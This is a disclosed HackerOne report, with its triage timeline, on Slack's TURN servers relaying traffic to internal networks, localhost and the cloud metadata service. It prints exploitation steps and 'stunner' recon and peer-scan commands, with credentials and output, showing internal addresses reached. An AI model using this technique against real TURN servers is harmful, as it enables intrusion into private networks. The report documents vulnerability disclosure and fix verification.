---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/network
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
date: 2020-03-12
submitted: 2018-04-04T14:05:47.045Z
bounty_usd: 3500
votes: 323
cve: []
program: "[[programs/slack|Slack]]"
reporter: "sandrogauci"
source: "https://hackerone.com/reports/333419"
title: "TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services"
---
# TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services

> **Severity:** Critical | **Bounty:** 3,500 USD | **Votes:** 323 | **Program:** Slack | **Disclosed:** 2020-03-12

- Report: [https://hackerone.com/reports/333419](https://hackerone.com/reports/333419)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2018-04-04T14:05:47.045Z

## Report summary

TURN server allowed proxying of TCP connections and UDP packets to internal Slack network and meta-data services on AWS.

## Timeline

- **Report Filed**
- **2018-04-06** @bugtriage-josh: Thank you for your report.

We're looking into this and will keep you updated when we have additional information.
- **Report Needs More Info**
- **Report New**
- **Report Triaged**
- **2018-04-12** @sandrogauci: Steps to exploit the vulnerability:

1. While passing through Burp as a proxy, try to make a call to some other Slack user
2. Note the HTTP response to the request at `/api/screenhero.rooms.create`
3. Set the TURN details (hostname and credentials) in the exploitation tool
4. Start the exploitation tool to proxy HTTP traffic over TURN
5. Access internal systems such as the meta-data service, localhost services or valid internal IP addresses

Video showing exploitation attached. Do let me know if this is sufficient.
- **2018-04-12** @fyunaz: @sandrogauci Thanks for the additional information and POC video. We are looking more into this. We will keep you updated when we have additional information.
- **2018-04-12** @fyunaz: @sandrogauci Our team just make some changes and spin up a dev instance for you to re-test this vulnerability. You can try and run you stunner tool again to this particular server `slack-calls-orca-dev-iad-3kjx.slack-core.com`. In your `slack.toml` config file, please add credentials the same way where you get it from https://<team>.slack.com/api/screenhero.rooms.create. Can you please confirm if this issue is fixed on this env?
- **2018-04-13** @sandrogauci: @fyunaz Thanks for the update. I have done one test which indicated that TCP proxying has been now disabled - which would address the issue with regards to TCP. However as I was preparing for a second test to check for UDP, I noticed that the host seemed to have been shutdown and its DNS entry removed. 

If you switch the system back on, I'm happy to do further tests to ensure that this would be fixed correctly on UDP as well.
- **2018-04-13** @fyunaz: @sandrogauci Sorry, it looks like the host was deprovision as part of our daily rebuild cycle in dev. We spin up a new instance for you to test `slack-calls-orca-dev-iad-ev4y.slack-core.com`. Can you please confirm both issues were fixed on this instance?
- **2018-04-13** @sandrogauci: @fyunaz No worries - thanks for providing me with another one. I verified that:

1. TCP relaying is disabled now
2. UDP is enabled (as it should be) and disabling most internal addresses except the following:
       - `0.0.0.0`
       - `100.64.0.0`
       - `224.0.0.1`

The most concerning is the `0.0.0.0` which still seems to allow localhost. I suggest that the relevant ranges on those special addresses are blocked. As mentioned in the original report, these are IP ranges in RFC6890.
- **2018-04-13** @fyunaz: @sandrogauci Thanks for your feedback. I reached out to the team and we added a patch to the same instance `slack-calls-orca-dev-iad-ev4y.slack-core.com`. Can you please retest and confirm the issues is fixed on this instance?
- **2018-04-14** @sandrogauci: @fyunaz to me it looks like all TURN traffic is now being blocked - which, apart from solving the security problem, would block legitimate usage as well (not good). 

Was the live system also updated with the new rules? Because it seems that I am no longer able to reproduce the issue on the live - which I was doing to make sure my tools are actually behaving as I expect them to.
- **2018-04-14** @fyunaz: @sandrogauci Thanks for confirming the patch work. Yes, we did start to roll out the patch to prod. We are still investigating this issue and we will follow up again with you next week.

Have a great weekend!
- **2018-04-18** @sandrogauci: @fyunaz Thought I'd follow up. What I meant was that according to my tests, it seemed the latest solution on your dev environment was blocking legitimate access. Essentially it seemed to me that the TURN servers both on live and dev were blocking all traffic not just that towards internal/special IP addresses. This would would block legitimate calls as well as attacks - which is usually undesirable. 

Perhaps my test was incorrect, or your engineers had applied such a solution where the TURN server was blocking everything. I'd be interested in knowing which one is which. 

I have just tested on the live again and could see that the behavior now is that TCP is disabled while special / internal IP addresses on UDP are still allowed. Do let me know if you would like me to test a different fix on your dev environment - and if so please give me a new address as the previous one is no longer valid.
- **2018-04-18** @fyunaz: @sandrogauci The dev instance that we shared with you should have the fix which only blocks internal/special IP addresses. It shouldn't block all TURN traffics. We have deployed the same patch to all of our production server, if you are testing the prod instance then you are testing the same patch. Are you confirmed that you are still able to use our TURN server to proxy to our  internal network using UDP protocol? Can you please provide more info on how you reproduce the issue? Another POC video would be great. Thanks!
- **2018-04-18** @fyunaz: @sandrogauci We have additional questions from the team. Can you please confirm if you can connect to multiple internal IP addresses or just one special IP address using the UDP protocol in your last test? Were you able to get any response from any internal TCP port with UDP protocol? 

We've spun up another dev instance with another patch for you to test `z-slack-calls-orca-research1.slack-core.com`. Can you please confirm if this patch fix the issue?
- **2018-04-19** @sandrogauci: @fyunaz thanks for spinning that test environment. 

I have summarised your comments as follows:


- dev instance should only block special IP addresses and not all traffic
- same solution was deployed on production too
- please confirm with video that you are able to proxy to our internal network using UDP, with UDP response
- were you able to get a response from TCP port via TURN UDP?
- we have a test dev instance for your testing `z-slack-calls-orca-research1.slack-core.com`

My responses for each of the above:

- that is not what my tests seem to indicate 
- production now seems to block TCP but not UDP on special addresses - see  the below tests
- Please find the output from our tests and attached pcaps which I hope can help; do let me know if this is not enough and I'll dedicate some time for a video showing the same exact thing
- No we were not able to get a response from TCP port through TURN UDP; the protocol itself does not allow that
- thanks for the test dev instance

When I run our reconnaissance tool on the live environment, I see the following results:

```
stunner recon --username '1524160678:U3VE3T72Q' --password 'HrVL1a/ZswyyLH52nW6xql0/CTo=' --server udp://slack-calls-orca-bru-qxb0.slack-core.com:22466                                                                                   


stunner v0.1
Started on 2018-04-18T19:59:57+02:00

stunner/proto> udp connection to slack-calls-orca-bru-qxb0.slack-core.com:22466 successful
stunner/proto> tcp connection to slack-calls-orca-bru-qxb0.slack-core.com:22466 successful
stunner/banners> Software banner: None
stunner/banners> Realm: slack.com
stunner/allocate> udp allocate (invalid auth) successful
stunner/allocate> tcp allocate (invalid auth) successful
stunner/allocate> udp recon long term creds authentication successful
stunner/allocate> udp reflexive transport address 91.64.185.21:40097
stunner/allocate> tcp recon long term creds authentication failed
stunner/allocate> udp recon short term creds authentication failed
stunner/allocate> tcp recon short term creds authentication failed
stunner/binding> udp recon binding successful
stunner/binding> reflexive transport address 91.64.185.21:58566
stunner/binding> tcp recon binding successful
stunner/binding> reflexive transport address 91.64.185.21:37588
stunner/channelbind> udp recon ChannelBind 8.8.8.8:80 successful
stunner/channelbind> tcp recon ChannelBind 8.8.8.8:80 failed
stunner/channelbind> udp recon ChannelBind 169.254.169.254:80 successful
stunner/channelbind> tcp recon ChannelBind 169.254.169.254:80 failed
stunner/channelbind> udp recon ChannelBind 127.0.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 127.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 0.0.0.0:80 successful
stunner/channelbind> tcp recon ChannelBind 0.0.0.0:80 failed
stunner/channelbind> udp recon ChannelBind 10.0.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 10.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 100.64.0.0:80 successful
stunner/channelbind> tcp recon ChannelBind 100.64.0.0:80 failed
stunner/channelbind> udp recon ChannelBind 169.254.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 169.254.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.0.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 192.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.0.2.1:80 successful
stunner/channelbind> tcp recon ChannelBind 192.0.2.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.88.99.1:80 successful
stunner/channelbind> tcp recon ChannelBind 192.88.99.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.168.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 192.168.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 198.18.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 198.18.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 198.51.100.1:80 successful
stunner/channelbind> tcp recon ChannelBind 198.51.100.1:80 failed
stunner/channelbind> udp recon ChannelBind 203.0.113.1:80 successful
stunner/channelbind> tcp recon ChannelBind 203.0.113.1:80 failed
stunner/channelbind> udp recon ChannelBind 224.0.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 224.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 240.0.0.1:80 successful
stunner/channelbind> tcp recon ChannelBind 240.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 255.255.255.255:80 successful
stunner/channelbind> tcp recon ChannelBind 255.255.255.255:80 failed
stunner/createpermission> udp recon CreatePermission 8.8.8.8:80 successful
stunner/createpermission> tcp recon CreatePermission 8.8.8.8:80 failed
stunner/createpermission> udp recon CreatePermission 169.254.169.254:80 successful
stunner/createpermission> tcp recon CreatePermission 169.254.169.254:80 failed
stunner/createpermission> udp recon CreatePermission 127.0.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 127.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 0.0.0.0:80 successful
stunner/createpermission> tcp recon CreatePermission 0.0.0.0:80 failed
stunner/createpermission> udp recon CreatePermission 10.0.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 10.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 100.64.0.0:80 successful
stunner/createpermission> tcp recon CreatePermission 100.64.0.0:80 failed
stunner/createpermission> udp recon CreatePermission 169.254.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 169.254.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.0.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 192.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.0.2.1:80 successful
stunner/createpermission> tcp recon CreatePermission 192.0.2.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.88.99.1:80 successful
stunner/createpermission> tcp recon CreatePermission 192.88.99.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.168.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 192.168.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 198.18.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 198.18.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 198.51.100.1:80 successful
stunner/createpermission> tcp recon CreatePermission 198.51.100.1:80 failed
stunner/createpermission> udp recon CreatePermission 203.0.113.1:80 successful
stunner/createpermission> tcp recon CreatePermission 203.0.113.1:80 failed
stunner/createpermission> udp recon CreatePermission 224.0.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 224.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 240.0.0.1:80 successful
stunner/createpermission> tcp recon CreatePermission 240.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 255.255.255.255:80 successful
stunner/createpermission> tcp recon CreatePermission 255.255.255.255:80 failed
```
This means that the TURN `CreatePermission` command is allowed on UDP for all the special addresses. TCP has been disabled since our initial report and therefore we get failure for all instances. To prove that this is still indeed a potential security problem, we ran a port 53 DNS scan as follows:


```
stunner turn peer scan  --username '1524195624:U3VE3T72Q' --password 'R0vf5RdFuqHO/isgt/uA7oLcNdw=' --server udp://slack-calls-orca-bru-qxb0.slack-core.com:22466 --scan-port-range 53 


stunner v0.1
Started on 2018-04-19T10:40:32+02:00

stunner> Scanning 127.0.0.1/32 for 53

Result from 127.0.0.1:53
([]uint8) (len=128 cap=1000) {
 00000000  40 b3 81 80 00 01 00 06  00 00 00 00 03 77 77 77  |@............www|
 00000010  06 67 6f 6f 67 6c 65 03  63 6f 6d 00 00 01 00 01  |.google.com.....|
 00000020  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 93  |............J}..|
 00000030  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 63  |............J}.c|
 00000040  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 67  |............J}.g|
 00000050  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 6a  |............J}.j|
 00000060  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 69  |............J}.i|
 00000070  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 68  |............J}.h|
}

stunner [info]> 1 payloads sent
1 seconds remaining until shutdown %               

```





```
stunner turn peer scan  --username '1524195624:U3VE3T72Q' --password 'R0vf5RdFuqHO/isgt/uA7oLcNdw=' --server udp://slack-calls-orca-bru-qxb0.slack-core.com:22466 --scan-port-range 53 --scan-ip-range 10.33.0.96


stunner v0.1
Started on 2018-04-19T10:58:15+02:00

stunner> Scanning 10.33.0.96 for 53

stunner [info]> 1 payloads sent
Result from 10.33.0.96:53
([]uint8) (len=128 cap=1000) {
 00000000  40 b3 81 80 00 01 00 06  00 00 00 00 03 77 77 77  |@............www|
 00000010  06 67 6f 6f 67 6c 65 03  63 6f 6d 00 00 01 00 01  |.google.com.....|
 00000020  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 68  |............J}.h|
 00000030  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 69  |............J}.i|
 00000040  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 93  |............J}..|
 00000050  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 67  |............J}.g|
 00000060  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 6a  |............J}.j|
 00000070  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 63  |............J}.c|
}
```

The reconnaissance tool was also run on your dev environment and it gave the below output indicating that all traffic is being blocked, including traffic meant to go to an internet IP address such as Google's `8.8.8.8`. Log below:


```
stunner recon --username '1524195624:U3VE3T72Q' --password 'R0vf5RdFuqHO/isgt/uA7oLcNdw=' --server udp://z-slack-calls-orca-research1.slack-core.com:22466

stunner v0.1
Started on 2018-04-19T10:37:18+02:00

stunner/proto> udp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful
stunner/proto> tcp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful
stunner/banners> Software banner: None
stunner/banners> Realm: slack.com
stunner/allocate> udp allocate (invalid auth) successful
stunner/allocate> tcp allocate (invalid auth) successful
stunner/allocate> udp recon long term creds authentication successful
stunner/allocate> udp reflexive transport address 91.64.185.21:38635
stunner/allocate> tcp recon long term creds authentication failed
stunner/allocate> udp recon short term creds authentication failed
stunner/allocate> tcp recon short term creds authentication failed
stunner/binding> udp recon binding successful
stunner/binding> reflexive transport address 91.64.185.21:51750
stunner/binding> tcp recon binding successful
stunner/binding> reflexive transport address 91.64.185.21:32972
stunner/channelbind> udp recon ChannelBind 8.8.8.8:80 failed
stunner/channelbind> tcp recon ChannelBind 8.8.8.8:80 failed
stunner/channelbind> udp recon ChannelBind 169.254.169.254:80 failed
stunner/channelbind> tcp recon ChannelBind 169.254.169.254:80 failed
stunner/channelbind> udp recon ChannelBind 127.0.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 127.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 0.0.0.0:80 failed
stunner/channelbind> tcp recon ChannelBind 0.0.0.0:80 failed
stunner/channelbind> udp recon ChannelBind 10.0.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 10.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 100.64.0.0:80 failed
stunner/channelbind> tcp recon ChannelBind 100.64.0.0:80 failed
stunner/channelbind> udp recon ChannelBind 169.254.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 169.254.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.0.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 192.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.0.2.1:80 failed
stunner/channelbind> tcp recon ChannelBind 192.0.2.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.88.99.1:80 failed
stunner/channelbind> tcp recon ChannelBind 192.88.99.1:80 failed
stunner/channelbind> udp recon ChannelBind 192.168.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 192.168.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 198.18.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 198.18.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 198.51.100.1:80 failed
stunner/channelbind> tcp recon ChannelBind 198.51.100.1:80 failed
stunner/channelbind> udp recon ChannelBind 203.0.113.1:80 failed
stunner/channelbind> tcp recon ChannelBind 203.0.113.1:80 failed
stunner/channelbind> udp recon ChannelBind 224.0.0.1:80 failed
stunner/channelbind> tcp recon ChannelBind 224.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 240.0.0.1:80 failed
stunner/channelbind> udp recon ChannelBind 255.255.255.255:80 failed
stunner/channelbind> tcp recon ChannelBind 255.255.255.255:80 failed
stunner/createpermission> udp recon CreatePermission 8.8.8.8:80 failed
stunner/createpermission> tcp recon CreatePermission 8.8.8.8:80 failed
stunner/createpermission> udp recon CreatePermission 169.254.169.254:80 failed
stunner/createpermission> tcp recon CreatePermission 169.254.169.254:80 failed
stunner/createpermission> udp recon CreatePermission 127.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 127.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 0.0.0.0:80 failed
stunner/createpermission> tcp recon CreatePermission 0.0.0.0:80 failed
stunner/createpermission> udp recon CreatePermission 10.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 10.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 100.64.0.0:80 failed
stunner/createpermission> tcp recon CreatePermission 100.64.0.0:80 failed
stunner/createpermission> udp recon CreatePermission 169.254.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 169.254.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.0.2.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.0.2.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.88.99.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.88.99.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.168.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.168.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 198.18.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 198.18.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 198.51.100.1:80 failed
stunner/createpermission> tcp recon CreatePermission 198.51.100.1:80 failed
stunner/createpermission> udp recon CreatePermission 203.0.113.1:80 failed
stunner/createpermission> tcp recon CreatePermission 203.0.113.1:80 failed
stunner/createpermission> udp recon CreatePermission 224.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 224.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 240.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 240.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 255.255.255.255:80 failed
stunner/createpermission> tcp recon CreatePermission 255.255.255.255:80 failed
1 seconds remaining until shutdown %                                              
```

Attached you will find two pcaps. One showing the DNS responses received from `127.0.0.1` and `10.33.0.96` on the live environment. Note that further research could indicate sensitive or vulnerable services on UDP so this is why I think its not just TCP that should be blocked for internal or special IP addresses.

The second pcap shows a similar test but done on the dev system that acutally blocks all traffic, including seemingly  legitimate traffic to `8.8.8.8`. This, I'm afraid, would lead to problems for calls behind NAT that require TURN. 

So to summarize:

1. Live system is not vulnerable anymore for TCP; but UDP remains open
2. Dev system is not vulnerable for either TCP or UDP; but also appears to block legitimate traffic
- **2018-04-19** @fyunaz: @sandrogauci Thanks for your detail response, we are looking into this.
- **2018-04-19** @fyunaz: @sandrogauci We added a patch to the `z-slack-calls-orca-research1.slack-core.com` to make it work for a legitimate traffic. Can you please re-run the test to that host again and confirm that the vulnerability fixed and we are not blocking any legitimate traffic? 

Thanks!
- **2018-04-20** @sandrogauci: Hi @fyunaz glad that it helped. I have rerun the tool on the new patch and yes it does reflect the recommended change, i.e. it looks like a correct fix. 

lines of interest from my test log:

```
stunner/proto> udp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful
stunner/proto> tcp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful
stunner/banners> Software banner: None
stunner/banners> Realm: slack.com
stunner/allocate> udp allocate (invalid auth) successful
stunner/allocate> tcp allocate (invalid auth) successful
stunner/allocate> udp recon long term creds authentication successful
stunner/allocate> udp reflexive transport address 91.64.185.21:38458
...
stunner/createpermission> udp recon CreatePermission 8.8.8.8:80 successful
stunner/createpermission> tcp recon CreatePermission 8.8.8.8:80 failed
stunner/createpermission> udp recon CreatePermission 169.254.169.254:80 failed
stunner/createpermission> tcp recon CreatePermission 169.254.169.254:80 failed
stunner/createpermission> udp recon CreatePermission 127.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 127.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 0.0.0.0:80 failed
stunner/createpermission> tcp recon CreatePermission 0.0.0.0:80 failed
stunner/createpermission> udp recon CreatePermission 10.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 10.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 100.64.0.0:80 failed
stunner/createpermission> tcp recon CreatePermission 100.64.0.0:80 failed
stunner/createpermission> udp recon CreatePermission 169.254.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 169.254.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.0.2.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.0.2.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.88.99.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.88.99.1:80 failed
stunner/createpermission> udp recon CreatePermission 192.168.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 192.168.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 198.18.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 198.18.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 198.51.100.1:80 failed
stunner/createpermission> tcp recon CreatePermission 198.51.100.1:80 failed
stunner/createpermission> udp recon CreatePermission 203.0.113.1:80 failed
stunner/createpermission> tcp recon CreatePermission 203.0.113.1:80 failed
stunner/createpermission> udp recon CreatePermission 224.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 224.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 240.0.0.1:80 failed
stunner/createpermission> tcp recon CreatePermission 240.0.0.1:80 failed
stunner/createpermission> udp recon CreatePermission 255.255.255.255:80 failed
stunner/createpermission> tcp recon CreatePermission 255.255.255.255:80 failed
```
- **2018-04-20** @fyunaz: @sandrogauci Awesome! Thanks for confirming the patch works. We will continue working on this. I will keep you updated when we have additional information.
- **2018-04-20** @sandrogauci: Excellent - yes do keep me up to date
- **2018-04-30** @sandrogauci: Hi @fyunaz - following up on the status of this one. Do you require anything else from our side?
- **2018-04-30** @fyunaz: Hi @sandrogauci, 
No, there's nothing that we need from your end at this point. Our team is still working on the additional fix. We will let you know when we have additional information.

Thanks!
- **2018-05-11** @fyunaz: Hi @sandrogauci, 

Thanks for your patience. We have pushed the patch to all of our production severs. We added more strict rules and also verified that all of our Calls functionality works with the current settings. It might seems like we are blocking legitimate traffic but it's not. We are only allowing necessary traffic. Can you please re-test all of your test cases one more time to our prod server especially the UDP over TURN to access the DNS server?

Thanks!
- **2018-05-14** @sandrogauci: Will test as soon as we can and get back to you.
- **2018-05-16** @fyunaz: @sandrogauci, kindly following up on the status. Did you confirm the fix? I think we can close this issue but would be great if can get your testing done before closing this.
- **2018-05-16** @sandrogauci: @fyunaz thanks for the follow up. I've been at a conference these last days and swamped with work. I think however I'll have time to verify the fixes sometime tomorrow. Do we test on live?
- **2018-05-16** @fyunaz: @sandrogauci Tomorrow sounds good. And yes, please do the testing on prod (live) system. Let me know if you need more information.

Thanks!
- **2018-05-19** @sandrogauci: Hi @fyunaz - we have tested the fix and realised that the fix blocks everything but UDP packets towards the WebRTC gateway. We didn't find ways to exploit this configuration to get any responses and are happy to close this issue. Thanks for awaiting our confirmation. Hope that our feedback and various retests were valuable to you and your colleagues.
- **2018-05-21** @sandrogauci: Just in case it was not clear from my response; I confirm that the fix appears to do the job.
- **Report Resolved**
- **Bounty Awarded**
- **2020-01-21** @sandrogauci: Hi @fyunaz  can you make this report public please?
- **Agreed On Going Public**
- **2020-02-25** @bugtriage-josh: Hey @sandrogauci,

We're going to temporarily cancel your disclosure request, as we are performing a review of high severity and above disclosures, and want give your report appropriate consideration before it becomes public. As soon as we complete our review, we will contact you about disclosure.

We apologize for the delay.
- **Cancelled Disclosure Request**
- **2020-02-28** @sandrogauci: Hi @bugtriage-josh - that comes unexpectedly as we were under the impression that you successfully resolved this issue 2 years ago. We have an educational presentation to give at Kamailio World and were hoping to use this report as an example of our contribution to the WebRTC security space. We're not interested in making Slack look bad of course; only to have practical and real examples to the VoIP/WebRTC developers in the audience.

Could you let me know when your review is planned to be complete so that we can prepare accordingly?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
